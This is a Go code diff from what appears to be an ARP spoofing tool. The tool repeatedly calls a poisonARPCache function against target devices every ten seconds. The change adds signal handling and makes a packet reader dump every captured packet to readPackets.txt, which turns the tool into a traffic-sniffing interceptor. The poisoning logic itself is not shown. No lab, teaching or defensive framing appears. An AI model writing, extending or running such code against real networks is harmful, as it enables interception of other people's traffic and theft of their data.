@@ -7,8 +7,10 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"os/signal"
 	"strings"
 	"sync"
+	"syscall"
 	"time"
 
 	"github.com/google/gopacket"
@@ -235,10 +237,11 @@ func getAttackerInfo(ifaceArg string) (*AttackerInfo, error) {
 	return &info, nil
 }
 
-func readPackets(deviceHandle *pcap.Handle) error {
+func readPackets(deviceHandle *pcap.Handle, log *os.File) {
 	packetSource := gopacket.NewPacketSource(deviceHandle, deviceHandle.LinkType())
 
 	for packet := range packetSource.Packets() {
+		fmt.Fprintln(log, packet.Dump())
 		arpLayer := packet.Layer(layers.LayerTypeARP)
 		if arpLayer == nil {
 			continue
@@ -251,8 +254,6 @@ func readPackets(deviceHandle *pcap.Handle) error {
 		fmt.Println("dst ip: ", net.IP(arp.DstProtAddress).String())
 		fmt.Println()
 	}
-
-	return nil
 }
 
 func main() {
@@ -290,24 +291,33 @@ func main() {
 		log.Fatal(err)
 	}
 
-	go func() {
-		defer func() {
-			if err := recover(); err != nil {
-				log.Fatal(err)
-			}
-		}()
-		if err := readPackets(deviceHandle); err != nil {
-			panic(err)
-		}
-	}()
+	endSignal := make(chan os.Signal, 1)
+	signal.Notify(endSignal, syscall.SIGTERM, syscall.SIGINT)
 
-	logFile, err := os.OpenFile("log.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 644)
+	writeARPFile, err := os.Create("writeARP.txt")
 	if err != nil {
 		log.Fatal(err)
 	}
+	defer writeARPFile.Close()
+
+	readPacketsFile, err := os.Create("readPackets.txt")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer readPacketsFile.Close()
+
+	go func() {
+		for sig := range endSignal {
+			fmt.Println(sig.String(), "detected. ending program")
+			close(endSignal)
+			os.Exit(0)
+		}
+	}()
+
+	go readPackets(deviceHandle, readPacketsFile)
 
 	for {
-		if err = poisonARPCache(devicesInfo, attackerInfo, deviceHandle, logFile); err != nil {
+		if err = poisonARPCache(devicesInfo, attackerInfo, deviceHandle, writeARPFile); err != nil {
 			log.Fatal(err)
 		}
 		time.Sleep(time.Second * 10)
